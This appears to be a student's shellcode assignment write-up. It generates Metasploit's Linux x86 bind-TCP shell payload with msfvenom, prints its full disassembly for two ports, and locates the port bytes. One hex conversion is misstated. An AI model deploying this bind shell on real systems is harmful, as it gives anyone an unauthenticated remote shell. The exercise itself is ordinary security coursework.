# Assignment 1

## What to do 

• Create a Shell_Bind_TCP shellcode 
   
    – Binds to a port 
   
    – Execs Shell on incoming connection 

• Port number should be easily configurable

## Solution

The easiest solution is to obtain the disassembled code from the bind_tcp_shell from Metasploit.

      sudo msfvenom -p linux/x86/shell_bind_tcp LPORT=8888 -b "\x00" -i 0 -f raw |ndisasm -u -

      00000000  31DB              xor ebx,ebx
      00000002  F7E3              mul ebx
      00000004  53                push ebx
      00000005  43                inc ebx
      00000006  53                push ebx
      00000007  6A02              push byte +0x2
      00000009  89E1              mov ecx,esp
      0000000B  B066              mov al,0x66
      0000000D  CD80              int 0x80
      0000000F  5B                pop ebx
      00000010  5E                pop esi
      00000011  52                push edx
      00000012  68020022B8        push dword 0xb8220002
      00000017  6A10              push byte +0x10
      00000019  51                push ecx
      0000001A  50                push eax
      0000001B  89E1              mov ecx,esp
      0000001D  6A66              push byte +0x66
      0000001F  58                pop eax
      00000020  CD80              int 0x80
      00000022  894104            mov [ecx+0x4],eax
      00000025  B304              mov bl,0x4
      00000027  B066              mov al,0x66
      00000029  CD80              int 0x80
      0000002B  43                inc ebx
      0000002C  B066              mov al,0x66
      0000002E  CD80              int 0x80
      00000030  93                xchg eax,ebx
      00000031  59                pop ecx
      00000032  6A3F              push byte +0x3f
      00000034  58                pop eax
      00000035  CD80              int 0x80
      00000037  49                dec ecx
      00000038  79F8              jns 0x32
      0000003A  682F2F7368        push dword 0x68732f2f
      0000003F  682F62696E        push dword 0x6e69622f
      00000044  89E3              mov ebx,esp
      00000046  50                push eax
      00000047  53                push ebx
      00000048  89E1              mov ecx,esp
      0000004A  B00B              mov al,0xb
      0000004C  CD80              int 0x80

Once we have it, we need to find the place where the PORT is injected. We locate it by changing the LPORT variable when running metasploit and comparing both outputs.

      sudo msfvenom -p linux/x86/shell_bind_tcp LPORT=9999 -b "\x00" -i 0 -f raw |ndisasm -u -

      00000000  31DB              xor ebx,ebx
      00000002  F7E3              mul ebx
      00000004  53                push ebx
      00000005  43                inc ebx
      00000006  53                push ebx
      00000007  6A02              push byte +0x2
      00000009  89E1              mov ecx,esp
      0000000B  B066              mov al,0x66
      0000000D  CD80              int 0x80
      0000000F  5B                pop ebx
      00000010  5E                pop esi
      00000011  52                push edx
      00000012  680200270F        push dword 0xf270002
      00000017  6A10              push byte +0x10
      00000019  51                push ecx
      0000001A  50                push eax
      0000001B  89E1              mov ecx,esp
      0000001D  6A66              push byte +0x66
      0000001F  58                pop eax
      00000020  CD80              int 0x80
      00000022  894104            mov [ecx+0x4],eax
      00000025  B304              mov bl,0x4
      00000027  B066              mov al,0x66
      00000029  CD80              int 0x80
      0000002B  43                inc ebx
      0000002C  B066              mov al,0x66
      0000002E  CD80              int 0x80
      00000030  93                xchg eax,ebx
      00000031  59                pop ecx
      00000032  6A3F              push byte +0x3f
      00000034  58                pop eax
      00000035  CD80              int 0x80
      00000037  49                dec ecx
      00000038  79F8              jns 0x32
      0000003A  682F2F7368        push dword 0x68732f2f
      0000003F  682F62696E        push dword 0x6e69622f
      00000044  89E3              mov ebx,esp
      00000046  50                push eax
      00000047  53                push ebx
      00000048  89E1              mov ecx,esp
      0000004A  B00B              mov al,0xb
      0000004C  CD80              int 0x80

We can see that the position where the code is different is 

      00000012  68020022B8        push dword 0xb8220002 (b822 in litte endian is 22b8 which is 8888 in decimal)

      00000012  680200270F        push dword 0xf270002 (0f27 in litte endian is 27f0 which is 9999 in decimal)

So, we only need to modify this line every time we want to change the listening port. 

To do that easily, you can use compile_bind_shell.sh. It asks to the user the filename and the port that will be set to the final binary.

